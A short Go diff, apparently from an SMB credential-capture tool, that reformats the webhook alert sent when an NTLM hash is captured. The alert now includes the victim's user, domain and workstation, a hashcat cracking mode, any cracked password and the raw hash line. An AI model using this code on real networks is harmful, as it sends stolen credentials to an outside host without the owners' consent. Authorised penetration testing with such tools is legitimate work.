@@ -2514,10 +2514,14 @@ func (s *SMBServer) broadcastNTLMEvent(c *CapturedHash, source, crackedPassword 
 	s.Hub.Broadcast <- b
 
 	if s.WebHook != nil {
-		msg := fmt.Sprintf("[SMB] - Source: %s - User: %s\\%s - Hash: %s", source, c.Domain, c.Username, c.HashcatLine)
+		msg := fmt.Sprintf(
+			"User: %s\nDomain: %s\nWorkstation: %s\nSource: %s\nHash Type: %s\nHashcat Mode: hashcat -m %s",
+			c.Username, c.Domain, c.Workstation, source, hashType, hashcatMode,
+		)
 		if crackedPassword != "" {
-			msg = fmt.Sprintf("%s - Cracked: %s", msg, crackedPassword)
+			msg = fmt.Sprintf("%s\nCracked: %s", msg, crackedPassword)
 		}
+		msg = fmt.Sprintf("%s\n\n%s", msg, c.HashcatLine)
 		logger.HandleWebhookSend(msg, "smb", *s.WebHook)
 	}
 }
